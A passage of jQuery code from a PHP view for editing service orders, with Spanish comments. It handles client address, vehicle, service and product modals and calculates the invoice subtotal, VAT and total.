                                $("#modal_cliente").modal('hide');
                                window.location.href = '<?php echo base_url(); ?>order/register';
                            });
                }
            });
        });
        //abrir modal direccion
        $(".add_direccion").click(function (e) {
            e.preventDefault();  // Para evitar que se envíe por defecto

            if ($("#codcliente").val() === '') {
                swal("Disculpe,", "debe seleccionar un cliente para registrar una dirección", 'warning');
                $('#typeahead_2').parent('div').addClass('has-error');
            } else {
                $("#customer_id").val($("#codcliente").val());
                $("#modal_direccion").modal('show');
                $("span#titulo").text('Registrar');

            }
        });

        //agregar direccion nueva
        $("#add_direccion").click(function (e) {
            e.preventDefault();  // Para evitar que se envíe por defecto
            $.post('<?php echo base_url(); ?>CClient/addAddress', $('#form_address').serialize(), function (response) {

                swal({
                    title: "Registro",
                    text: "Guardado con exito",
                    type: "success"
                },
                        function () {
                            $("#modal_direccion").modal('hide');
                            $('#codcliente').val();
                            var cliente_id = $('#codcliente').val();
                            $('#address').find('option:gt(0)').remove().end().select2('val', '0');
                            $.get('<?php echo base_url(); ?>CClient/ajax_address/' + cliente_id + '', function (data) {
                                var option = "";
                                $.each(data, function (i) {
                                    option += "<option value=" + data[i]['id'] + ">" + data[i]['city'] + ' - ' + data[i]['address_1'] + "</option>";

                                });

                                $('#address').append(option);

                            }, 'json');
                        });

            });
        });


        //agregar carro nuevo
        $("#add_car").click(function (e) {
            e.preventDefault();  // Para evitar que se envíe por defecto
            $.post('<?php echo base_url(); ?>CClient/addCar', $('#form_vehi').serialize(), function (response) {
                if (response[0] == 'e') {

                    swal("Disculpe,", "este vehiculo se encuentra registrado");

                } else {
                    swal({
                        title: "Registro",
                        text: "Guardado con exito",
                        type: "success"
                    },
                            function () {
                                $("#modal_vehiculo").modal('hide');
                                $('#codcliente').val();
                                var cliente_id = $('#codcliente').val();
                                $('#vehiculo').find('option:gt(0)').remove().end().select2('val', '0');
                                $.get('<?php echo base_url(); ?>CClient/ajax_car/' + cliente_id + '', function (data) {
                                    var option = "";
                                    $.each(data, function (i) {
                                        option += "<option value=" + data[i]['id'] + ">" + data[i]['license_plate'] + ' - ' + data[i]['trademark'] + "</option>";
                                    });

                                    $('#vehiculo').append(option);



                                }, 'json');
                            });
                }
            });
        });
        //abrir modal vehiculo
        $(".add_vehiculo").click(function (e) {
            e.preventDefault();  // Para evitar que se envíe por defecto

            if ($("#codcliente").val() === '') {
                swal("Disculpe,", "debe seleccionar un cliente para registrar un vehiculo", 'warning');
                $('#typeahead_2').parent('div').addClass('has-error');
            } else {
                $("#customer_id2").val($("#codcliente").val());
                $("#modal_vehiculo").modal('show');
                $("span#titulo").text('Registrar');
            }

        });


        $("#i_new_line").click(function (e) {

            e.preventDefault();  // Para evitar que se envíe por defecto
            if ($("#codcliente").val() === '') {
                swal("Disculpe,", "debe seleccionar un cliente para continuar", 'warning');
                $('#typeahead_2').parent('div').addClass('has-error');
            } else {
                $("#modal_servicio").modal('show');
                $("span#titulo").text('Agregar');
                $("#accion").val('Registrar');


                $.get('<?php echo base_url(); ?>CServices/ajax_service', function (data) {

                    var $input = $(".typeahead_3");
                    
                    $input.typeahead({
                        source:data,
                        autoSelect: true,

                      });
                    
                    $input.change(function() {
                        var current = $input.typeahead("getActive");
                        if (current) {                            
                          // Some item from your model is active!
                          if (current.name == $input.val()) {
  
                                $('#price').val(current.price);
                                $('#id_service').val(current.id)
                            // This means the exact match is found. Use toLowerCase() if you want case insensitive match.
                          } else {
                               $('#price').val('');
                               $('#id_service').val('');
                            // This means it is only a partial match, you can either add a new item
                            // or take the active if you don't want new items
                          }
                        } else {
                            $('#price').val('');
                            $('#id_service').val('');
                          // Nothing is active so it is a new value (or maybe empty value)
                        }
                      });

                }, 'json');
            }
        });


        $("#agregar").click(function () {

            var table = $('#tab_servicio').DataTable();
            var accion = $("#accion").val();
            var servicio0;
            var posi = $("#posicion").val();
            var id_service = $("#id_service").val();
            var service = $("#service_id").val();
            var price = $("#price").val();
            var impuesto = $("#impuesto").val();
            var botonEdit = "<a style='color: #1ab394' class='editar'><i class='fa fa-edit fa-2x'></i></a>";
            var botonQuitar = "<a style='color: #1ab394' class='quitar'><i class='fa fa-trash fa-2x'></i></a>";

            $("#tab_servicio tbody tr").each(function () {

                servicio0 = $(this).attr('id');  // capturamos el id del servicio

            });

            if (accion === 'Registrar') {

                if (id_service === '') {
                    swal("Disculpe,", "debe añadir un servicio válido", 'warning');
                    
                    
                } else if (id_service === servicio0) {
                    swal("Disculpe,", "el servicio se encuentra añadido", 'warning');
                    $("#modal_servicio").modal('hide');
                    $("#service_id").val('');
                    $("#price").val('');
                    $("#impuesto").val('');
                    $('#posicion').val('');
                    $('#accion').val('');
                } else {

                    if (service !== '' & price !== '' & impuesto !== '') {

                        var i = table.row.add([service, price, impuesto, price, botonEdit, botonQuitar]).draw();
                        table.rows(i).nodes().to$().attr("id", id_service);
                           
                        // Ejecución de los cálculos de la factura
                        calculos(subtotal(), iva_total());  // Cálculo del subtotal, IVA y Total

                        $("#modal_servicio").modal('hide');
                        $("#service_id").val('');
                        $("#price").val('');
                        $("#impuesto").val('');
                        $('#posicion').val('');
                        $('#accion').val('');


                    } else {
                        swal({
                            title: "Disculpe,",
                            text: "No se admite campos vacios",
                            type: "warning"
                        },
                                function () {
                                    //window.location.href = '<?php echo base_url(); ?>clients';
                                });
                    }
                }

            } else if (accion === 'Editar') {


                if (service !== '' & price !== '' & impuesto !== '') {


                    var j = table.row(posi).data([service, price, impuesto, price, botonEdit, botonQuitar]).draw();
                    
                    // Ejecución de los cálculos de la factura
                    calculos(subtotal(), iva_total());  // Cálculo del subtotal, IVA y Total
                    $("#modal_servicio").modal('hide');
                    $("#service_id").val('');
                    $("#price").val('');
                    $("#impuesto").val('');
                    $('#posicion').val('');
                    $('#accion').val('');

                } else {
                    swal({
                        title: "Disculpe,",
                        text: "No se admite campos vacios",
                        type: "warning"
                    },
                            function () {
                                //window.location.href = '<?php echo base_url(); ?>clients';
                            });
                }
            }
            
        });


        $("table#tab_servicio").on('click', 'a.editar', function () {

            posicion = $(this).closest('tr').index();

            $("#modal_servicio").modal('show');
            $('#posicion').val(posicion);
            $('#accion').val('Editar');
            $("span#titulo").text('Editar');

            $(this).closest('tr').each(function () {
                var servicio0, servicio1, servicio2, servicio3;
                servicio0 = $(this).attr('id');  // Código correlativo del registro en la tabla 
                servicio1 = $(this).find('td').eq(0).text();
                servicio2 = $(this).find('td').eq(1).text();
                servicio3 = $(this).find('td').eq(2).text();
                servicio4 = $(this).find('td').eq(3).text();

                servicios = servicio0 + ';' + servicio1 + ';' + servicio2 + ';' + servicio3 + ';' + servicio4 + ';';

                $("#service_id").val(servicio1);
                $("#price").val(servicio2);
                $("#impuesto").val(servicio3);


            });

        });

        $("#i_new_line2").click(function (e) {
            e.preventDefault();  // Para evitar que se envíe por defecto
            if ($("#codcliente").val() === '') {
                swal("Disculpe,", "debe seleccionar un cliente para continuar", 'warning');
                $('#typeahead_2').parent('div').addClass('has-error');
            } else {
                $("#modal_producto").modal('show');
                $("#product_id").val('');
                $("#quantity1").val('');
                $("#price1").val('');
                $('#impuesto1').val('');
                $("span#titulo").text('Agregar');
                $("#accion1").val('Registrar');


                $.get('<?php echo base_url(); ?>CProduct/ajax_product', function (data) {

                     var $input2 = $(".typeahead_4");
                    
                    $input2.typeahead({
                        source:data,
                        autoSelect: true,

                      });
                    
                    $input2.change(function() {
                        var current = $input2.typeahead("getActive");
                        if (current) {                            
                          // Some item from your model is active!
                          if (current.name == $input2.val()) {
                              
                                $('#price').val(current.price);
                                $('#id_product').val(current.id);
             
                            // This means the exact match is found. Use toLowerCase() if you want case insensitive match.
                          } else {
                               $('#price').val('');
                               $('#id_product').val('');
                            // This means it is only a partial match, you can either add a new item
                            // or take the active if you don't want new items
                          }
                        } else {
                            $('#price').val('');
                            $('#id_product').val('');
                          // Nothing is active so it is a new value (or maybe empty value)
                        }
                      });

                    

                }, 'json');
            }
        });

        $("#agregar2").click(function () {

            var producto0;
            var table = $('#tab_producto').DataTable();
            var accion = $("#accion1").val();
            var posi = $("#posicion1").val();
            var id_producto = $("#id_product").val();
            var producto = $("#product_id").val();
            var cantidad = $("#quantity1").val();
            var precio = $("#price1").val();
            var impuesto = $("#impuesto1").val();
            var importe = parseFloat(cantidad) * parseFloat(precio);
            var botonEdit = "<a style='color: #1ab394' class='editar'><i class='fa fa-edit fa-2x'></i></a>";
            var botonQuitar = "<a style='color: #1ab394' class='quitar'><i class='fa fa-trash fa-2x'></i></a>";

            $("#tab_producto tbody tr").each(function () {

                producto0 = $(this).attr('id');  // Código correlativo del registro en la tabla 


            });
            

            if (accion === 'Registrar') {

                 if (id_producto === '') {
                    swal("Disculpe,", "debe añadir un producto válido", 'warning');
                    
                    
                } else if (id_producto === producto0) {

                    swal("Disculpe,", "el producto se encuentra añadido", 'warning');
                    $("#modal_producto").modal('hide');
                    $("#product_id").val('');
                    $("#quantity1").val('');
                    $("#price1").val('');
                    $('#impuesto1').val('');
                    $('#posicion1').val('');
                    $('#accion1').val('');
                } else {

                    if (id_producto !== '' & cantidad !== '' & precio !== '' & impuesto !== '') {

                        var i = table.row.add([producto, precio, cantidad, impuesto, importe, botonEdit, botonQuitar]).draw();
                        table.rows(i).nodes().to$().attr("id", id_producto);

                        // Ejecución de los cálculos de la factura
                        calculos(subtotal(), iva_total());  // Cálculo del subtotal, IVA y Total

                        $("#modal_producto").modal('hide');
                        $("#product_id").val('');
                        $("#quantity1").val('');
                        $("#price1").val('');
                        $('#impuesto1').val('');
                        $('#posicion1').val('');
                        $('#accion1').val('');



                    } else {
                        swal({
                            title: "Disculpe,",
                            text: "No se admite campos vacios",
                            type: "warning"
                        },
                                function () {
                                    //window.location.href = '<?php echo base_url(); ?>clients';
                                });

                    }

                }


            } else if (accion === 'Editar') {


                if (id_producto !== '' & cantidad !== '' & precio !== '' & impuesto !== '') {


                    var j = table.row(posi).data([producto, precio, cantidad, impuesto, importe, botonEdit, botonQuitar]).draw();
                   
                    // Ejecución de los cálculos de la factura
                    calculos(subtotal(), iva_total());  // Cálculo del subtotal, IVA y Total
                    $("#modal_producto").modal('hide');
                    $("#product_id").val('');
                    $("#quantity1").val('');
                    $("#price1").val('');
                    $('#impuesto1').val('');
                    $('#posicion1').val('');
                    $('#accion1').val('');

                } else {
                    swal({
                        title: "Disculpe,",
                        text: "No se admite campos vacios",
                        type: "warning"
                    },
                            function () {
                                //window.location.href = '<?php echo base_url(); ?>clients';
                            });

                }


            }


        });

        //metodo para eliminar un registro de la tabla
        $("table#tab_servicio").on('click', 'a.quitar', function () {
            
            var cod_reg = '';

            if ($(this).attr('id') !== undefined) {

                cod_reg = $(this).attr('id');


                if ($("#codigos_des1").val() === '') {
                    $("#codigos_des1").val(cod_reg);
                } else {
                    $("#codigos_des1").val($("#codigos_des1").val() + ',' + cod_reg);
                }

            }

            var aPos = $("table#tab_servicio").dataTable().fnGetPosition(this.parentNode.parentNode);
            $("table#tab_servicio").dataTable().fnDeleteRow(aPos);

            // Ejecución de los cálculos de la factura
            calculos(subtotal(), iva_total());  // Cálculo subtotal, IVA y Total


        });

        //metodo para eliminar un registro de la tabla
        $("table#tab_producto").on('click', 'a.quitar', function () {
            
            var cod_reg = '';
            
            if ($(this).attr('id') !== undefined) {

                cod_reg = $(this).attr('id');
                //alert(cod_reg);

                if ($("#codigos_des2").val() === '') {
                    $("#codigos_des2").val(cod_reg);
                } else {
                    $("#codigos_des2").val($("#codigos_des2").val() + ',' + cod_reg);
                }

            }

            var aPos = $("table#tab_producto").dataTable().fnGetPosition(this.parentNode.parentNode);
            $("table#tab_producto").dataTable().fnDeleteRow(aPos);

            // Ejecución de los cálculos de la factura
            calculos(subtotal(), iva_total());  // Cálculo del subtotal, IVA y Total


        });

        $('#volver').click(function () {
            url = '<?php echo base_url() ?>order/';
            window.location = url;
        });



        var cliente_id = $('#codcliente').val();
     
        $.get('<?php echo base_url(); ?>CClient/ajax_client2/' + cliente_id + '', function (data) {

            $.each(data, function (i) {

                $("#typeahead_2").val(data[i]['name']+' '+data[i]['lastname']);
            });


        }, 'json');
  


        $("table#tab_producto").on('click', 'a.editar', function () {

            posicion = $(this).closest('tr').index();

            $("#modal_producto").modal('show');
            $('#posicion1').val(posicion);
            $('#accion1').val('Editar');
            $("span#titulo").text('Editar');

            $(this).closest('tr').each(function () {
                var producto0, producto1, producto2, producto3;
                producto0 = $(this).attr('id');  // Código correlativo del registro en la tabla 
                producto1 = $(this).find('td').eq(0).text();
                producto2 = $(this).find('td').eq(1).text();
                producto3 = $(this).find('td').eq(2).text();
                producto4 = $(this).find('td').eq(3).text();
                producto5 = $(this).find('td').eq(4).text();


                productos = producto0 + ';' + producto1 + ';' + producto2 + ';' + producto3 + ';' + producto4 + ';' + ';' + producto5 + ';';

                $("#product_id").val(producto1);
                $("#price1").val(producto2);
                $("#quantity1").val(producto3);
                $('#impuesto1').val(producto4);



            });

        });



        $("#registrar").click(function (e) {


            e.preventDefault();  // Para evitar que se envíe por defecto

             // recorriendo la tabla servicio para verificar que tenga datos
            $("#tab_servicio tbody tr").each(function () {

                datos = $(this).find('td').eq(0).text();

            });

            if (datos == 'Ningún dato disponible en esta tabla') {
                swal("Disculpe,", "debe añadir al menos un servicio");


            } else {

                if ($('#franchise_id').val() == '0') {

                    swal("Disculpe,", "para continuar debe seleccionar la franquicia");
                    $('#franchise_id').parent('div').addClass('has-error');

                } else if ($('#vehiculo').val() == '0') {

                    swal("Disculpe,", "para continuar debe seleccionar el vehiculo");
                    $('#vehiculo').parent('div').addClass('has-error');

                } else if ($('#address').val() == '0') {

                    swal("Disculpe,", "para continuar debe seleccionar la dirección");
                    $('#address').parent('div').addClass('has-error');

                } else {
                    var accion = 'update';
                    var data_send;
                    var servicio = "";
                    var producto = "";
                    data_send = new FormData($("#form_order")[0]);
                    var cantidad = $('#tab_servicio tr').length;
                    var cantidad_2 = $('#tab_producto tr').length;
                    var row = cantidad - 1;
                    var row_2 = cantidad_2 - 1;

                    if (row > 0 && row_2 > 0) {

                        $("#tab_servicio tbody tr").each(function () {
                            var servicio0,servicio01, servicio1, servicio2, servicio3, servicio4;
                            servicio0 = $(this).attr('id');  // id order services 
                            servicio01 = $(this).find('td').eq(0).attr('id'); // id services
                            servicio1 = $(this).find('td').eq(0).text();
                            servicio2 = $(this).find('td').eq(1).text();
                            servicio3 = $(this).find('td').eq(2).text();
                            servicio4 = $(this).find('td').eq(3).text();


                            servicio = servicio0 + ';' + servicio01 + ';' + servicio1 + ';' + servicio2 + ';' + servicio3 + ';' + servicio4 + ';';
                            servicio = servicio.substring(0, servicio.length - 1);
                            data_send.append("servicio[]", servicio);

                        });

                        $("#tab_producto tbody tr").each(function () {
                            var producto0,producto01, producto1, producto2, producto3, producto4, producto5;
                            producto0 = $(this).attr('id');  // id order_product
                            producto01 = $(this).find('td').eq(0).attr('id'); //id product
                            producto1 = $(this).find('td').eq(0).text();
                            producto2 = $(this).find('td').eq(1).text();
                            producto3 = $(this).find('td').eq(2).text();
                            producto4 = $(this).find('td').eq(3).text();
                            producto5 = $(this).find('td').eq(4).text();

                            producto = producto0 + ';' + producto01+ ';'  + producto1 + ';' + producto2 + ';' + producto3 + ';' + producto4 + ';' + producto5 + ';';
                            producto = producto.substring(0, producto.length - 1);
                            data_send.append("producto[]", producto);

                        });

                        var $url = '<?= base_url() ?>COrder/' + accion;
                        $.ajax({
                            url: $url,
                            type: 'POST',
                            cache: false,
                            data: data_send,
                            processData: false,
                            contentType: false,
                            dataType: "html"
                        }).done(function (data) {
                            if (data === '') {
                                swal({
                                    title: "Registro",
                                    text: "Actualizado con exito",
                                    type: "success"
                                },
                                        function () {
                                            window.location.href = '<?php echo base_url(); ?>order';
                                        });
                            }
                        });


                    }
                }
            } //else

        });
    });

    // Cálculo del subtotal
    function subtotal() {

        var importe1 = 0;
        var importe2 = 0;
        var sub_iva = 0;
        var sub_total = 0;

        $("#tab_servicio tbody tr").each(function (index) {

            $(this).children("td").each(function (index2)
            {
                switch (index2)
                {
                    // Leer el campo de importe
                    case 3:
                        importe1 = parseFloat($(this).text());
                        break;
                }
            })

            sub_total += importe1;
        })

        $("#tab_producto tbody tr").each(function (index) {

            $(this).children("td").each(function (index2)
            {
                switch (index2)
                {
                    // Leer el campo de importe
                    case 4:
                        importe2 = parseFloat($(this).text());
                        break;
                }
            })

            sub_total += importe2;
        })

        //~ alert(sub_total);

        return sub_total;
    }

    // Cálculo del iva total
    function iva_total() {

        var total_iva = 0;
        var sub_iva1 = 0;
        var sub_iva2 = 0;
        var cantidad = 0;
        var precio = 0;

        $("#tab_servicio tbody tr").each(function (index) {

            $(this).children("td").each(function (index2)
            {
                //~ base_imponible = base_imponible + parseFloat($(this).text());
                switch (index2)
                {
                    // Leer el campo de iva
                    case 1:
                        precio = parseFloat($(this).text());
                        break;
                        // Leer el campo de importe
                    case 2:
                        sub_iva1 = parseFloat($(this).text());
                        break;
                }
            })

            sub_iva1 = precio * sub_iva1 / 100;

            total_iva = total_iva + sub_iva1;
        })

        $("#tab_producto tbody tr").each(function (index) {

            $(this).children("td").each(function (index2)
            {
                //~ base_imponible = base_imponible + parseFloat($(this).text());
                switch (index2)
                {
                    // Leer el campo de iva
                    case 1:
                        precio = parseFloat($(this).text());
                        break;
                        // Leer el campo de importe
                    case 2:
                        cantidad = parseFloat($(this).text());
                        break;
                        // Leer el campo de importe
                    case 3:
                        sub_iva2 = parseFloat($(this).text());
                        break;
                }
            })

            sub_iva2 = precio * sub_iva2 / 100;

            total_iva = total_iva + (sub_iva2 * cantidad);
        })

        //~ alert(total_iva);

        return total_iva;
    }

    // Función para la realización de los cálculos del subtotal, IVA y Total
    function calculos(subtotal, iva_total) {
        var st = subtotal;
        var iva = iva_total;

        // Cáculo del sub_total
        if (st == '') {
            st = 0;
        }

        $("#sub_total").val(parseFloat(st));  // Cargamos la base imponible en el campo oculto para guardarlo en base de datos
        $("#span_sub_total").text(parseFloat(st).toFixed(2));  // Cargamos la base imponible en la página sólo para visualización

        // Cálculo del IVA
        $("#iva_total").val(parseFloat(iva));
        $("#span_iva").text(parseFloat(iva).toFixed(2));

        // Cálculo del Total
        $("#total").val((parseFloat($("#sub_total").val()) + parseFloat($("#iva_total").val())).toFixed(2));  // Cargamos el total en el campo oculto para guardarlo en base de datos
        $("#span_total").text((parseFloat($("#sub_total").val()) + parseFloat($("#iva_total").val())).toFixed(2));  //Cargamos el total en la página sólo para visualización
    }

</script>
